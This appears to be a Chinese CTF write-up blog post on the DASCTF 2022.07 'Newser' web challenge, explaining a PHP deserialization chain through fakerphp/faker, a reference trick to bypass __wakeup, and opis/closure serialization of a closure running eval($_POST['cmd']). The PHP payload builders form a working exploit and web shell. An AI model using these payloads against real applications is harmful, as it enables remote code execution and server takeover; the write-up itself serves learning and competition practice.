<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;fakerphp/faker&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.19&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;opis/closure&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//这里面可以看到包含了 两个包，一个是用来操作虚假对象的（比如生成随机的用户名，密码，名字，邮箱等信息），另一个是用来操作闭包的，也就是匿名函数。</span></span><br></pre></td></tr></table></figure>

<p>然后自己手动得到源码<code>composer require fakerphp/faker ; composer require opis/closure</code> (这里最好是通过<code>composer install</code> 下载到准确的版本源码，我这里是复现就懒得搞了&#x3D;。&#x3D;)，然后就是挖利用链了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">trigger_deprecation</span>(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line">     ......</span><br></pre></td></tr></table></figure>

<p>利用User的<code>__destruct</code> 方法访问不存在的属性，触发fakerphp依赖下面的Generator类下的<code>__get</code>方法，format下的call_user_func_array再到getFormatter下面的<code>return</code> ，但是这里有个问题便是<code>unserialize</code>之后formatters 会被清空，所以这里就要绕过<code>__wakeup</code> ，在这里其实不是作者提供的版本的fakerphp的话，还有一条利用差不多，同样是进入到ValidGenerator类的<code>__get</code> 方法，然后转到<code>__call</code>方法，但是作者在这里直接die掉了，所以只能绕过上面的<code>__wakeup</code>。</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220924141544-zg6znry.png" alt="image.png"></p>
<p>那么问题来了，怎么绕过<code>__wakeup</code> 查看php版本发现是php8，没有多属性的特性，这里利用到了<code>php引用来绕过__wakeup</code> ，下面是一个实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A is constructed!     &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;a unserialize!      &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;apple = <span class="string">&quot;You Have be Hacked!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key-&gt;<span class="keyword">eval</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eval</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;B is contructed!    &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span> != <span class="string">&quot;secure&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span> = <span class="string">&quot;secure&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;b unserialize!     &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//new 对象是先B后A</span></span><br><span class="line"><span class="comment">//new a();</span></span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="comment">//$class1-&gt;apple = &quot;Hacked!&quot;;</span></span><br><span class="line"><span class="variable">$class1</span>-&gt;key-&gt;<span class="keyword">eval</span> = &amp;<span class="variable">$class1</span>-&gt;apple;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$class1</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:1:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:2:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:1:&#123;s:4:&quot;eval&quot;;N;&#125;s:5:&quot;apple&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:2:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:1:&#123;s:4:&quot;eval&quot;;N;&#125;s:5:&quot;apple&quot;;R:3;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;a&quot;:2:&#123;s:3:&quot;key&quot;;O:1:&quot;b&quot;:1:&#123;s:4:&quot;eval&quot;;N;&#125;s:5:&quot;apple&quot;;R:3;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">B is contructed!    A is constructed!     &lt;hr&gt;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;eval&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;apple&quot;</span>;R:<span class="number">3</span>;&#125;b unserialize!     a unserialize!      &lt;hr&gt;You Have be Hacked!</span><br><span class="line"></span><br><span class="line">我自己的理解：所谓引用绕过就是一个顺序问题，重点就是要使<span class="variable language_">$this</span>-&gt;apple的赋值在<span class="class"><span class="keyword">class</span> <span class="title">b</span>的<span class="title">__wakeup</span>之后</span></span><br></pre></td></tr></table></figure>

<p>这里我自己写了个demo便于理解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;***&quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;first&quot;</span> . <span class="variable">$a</span> . <span class="variable">$b</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="number">4</span>; <span class="comment">//重点就是$b要在最后赋值为恶意的数据</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;second&quot;</span> . <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line">***<span class="number">2</span></span><br><span class="line">first33</span><br><span class="line">second4</span><br></pre></td></tr></table></figure>

<p>既然可以绕过，payload就可以构造出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>),<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>())));</span><br><span class="line">    <span class="comment">//echo base64_encode(serialize(new User()));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的执行顺序是：先Faker下的<code>__construct</code>然后才是User下的<code>__construct</code>就满足了我上面说的绕过条件 : )，这里有几个注意点，第一点：为什么官方wp进行了<code>str_replace</code>替换，官方的解释是<code>原来类的password属性是private的，而因为要构造引用，需要在类外访问，于是我改成了public，但是在最后还是需要修改成对应的private。</code> 但是其实这里直接使用public也是可以的，因为在<code>PHP7.1以上版本对属性类型不敏感</code> ，同时我自己测试也是可以的，这算是对官方wp的补充了。第二点：为什么传入phpinfo，是因为这里<code>__get</code> 的参数不可控，只能使用无参的函数进行验证。（这里其实也为后面rce做了铺垫）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>());</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//这里是可以直接执行phpinfo()的</span></span><br></pre></td></tr></table></figure>

<p>第三点：为什么数组的键是<code>__username</code>，我在这里绕了好久直到看到下面的，好吧我是fw。<img src="/img/loading.gif" data-original="/img/image-20220924143636-0teuz36.png" alt="image.png"></p>
<h3 id="反序列化匿名函数造成任意代码执行："><a href="#反序列化匿名函数造成任意代码执行：" class="headerlink" title="反序列化匿名函数造成任意代码执行："></a>反序列化匿名函数造成任意代码执行：</h3><p>这里只能控制传入的函数显然是不能拿到flag，主要是由于参数不可控，那这里就想到了闭包函数不是也可以吗，同时结合composer.json里面的<code>opis/closure</code> ，这不是刚好可以<code>反序列化闭包函数rce</code>嘛</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;  <span class="comment">//题目php版本是8.0.6，php7.1以上对属性类型不敏感</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="comment">//$this-&gt;_password = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">            <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">            	<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;;    <span class="comment">//可写马，测试用的phpinfo;</span></span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">            <span class="comment">//require(&#x27;vendor/autoload.php&#x27;); 这里二者区别主要就是编译的目录不同</span></span><br><span class="line">            <span class="variable">$b</span>=\Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="variable">$c</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo serialize(new User()).&quot;\n&quot;;</span></span><br><span class="line">    <span class="comment">// echo str_replace(&quot;s:8:\&quot;password\&quot;&quot;,urldecode(&quot;s%3A14%3A%22%00User%00password%22&quot;),serialize(new User())).&quot;\n&quot;;</span></span><br><span class="line">    <span class="comment">//echo base64_encode(str_replace(&quot;s:8:\&quot;password\&quot;&quot;,urldecode(&quot;s%3A14%3A%22%00User%00password%22&quot;),serialize(new User())));</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/img/image-20220924144605-ob4kxdr.png" alt="image.png"></p>
<p><img src="/img/loading.gif" data-original="/img/image-20220924144534-hp5j5o1.png" alt="image.png"></p>
<p>写在最后：好久没碰web导致有好多小知识点很模糊，这次复现也是学到了很多，师傅们发现文章有问题的可以私聊俺的扣扣，欢迎交流&#x3D;。&#x3D;</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Yy1n9</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/post/1.html">http://example.com/post/1.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Yy1n9</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/2022/">2022</a></div><div class="post_share"><div class="social-share" data-image="/img/tag.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/post/0.html"><img class="prev-cover" src="/img/loading.gif" data-original="https://p2.ssl.qhimg.com/t018d5477d28bc004fb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022_star_ctf复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/0.html" title="2022_star_ctf复现"><img class="cover" src="/img/loading.gif" data-original="https://p2.ssl.qhimg.com/t018d5477d28bc004fb.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-24</div><div class="title">2022_star_ctf复现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Yy1n9</div><div class="author-info__description">生来应为高山,而非草芥。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is Yy1n9's Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B-Web"><span class="toc-number">1.</span> <span class="toc-text">DASCTF2022.07赋能赛-Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">链接：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ez-to-getflag"><span class="toc-number">3.</span> <span class="toc-text">Ez to getflag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">题解：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">思考：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Harddisk"><span class="toc-number">4.</span> <span class="toc-text">Harddisk</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-1"><span class="toc-number">4.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-1"><span class="toc-number">4.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">绝对防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-2"><span class="toc-number">5.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-2"><span class="toc-number">5.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Newser"><span class="toc-number">6.</span> <span class="toc-text">Newser</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-3"><span class="toc-number">6.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%EF%BC%9A-1"><span class="toc-number">6.2.</span> <span class="toc-text">链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-3"><span class="toc-number">6.3.</span> <span class="toc-text">题解：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-number">6.3.1.</span> <span class="toc-text">反序列化匿名函数造成任意代码执行：</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/0.html" title="2022_star_ctf复现"><img src="/img/loading.gif" data-original="https://p2.ssl.qhimg.com/t018d5477d28bc004fb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022_star_ctf复现"/></a><div class="content"><a class="title" href="/post/0.html" title="2022_star_ctf复现">2022_star_ctf复现</a><time datetime="2022-09-24T08:09:01.529Z" title="发表于 2022-09-24 01:09:01">2022-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/1.html" title="DASCTF2022.07赋能赛-Web复现"><img src="/img/loading.gif" data-original="/img/tag.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2022.07赋能赛-Web复现"/></a><div class="content"><a class="title" href="/post/1.html" title="DASCTF2022.07赋能赛-Web复现">DASCTF2022.07赋能赛-Web复现</a><time datetime="2022-09-24T07:57:13.218Z" title="发表于 2022-09-24 00:57:13">2022-09-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Yy1n9</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>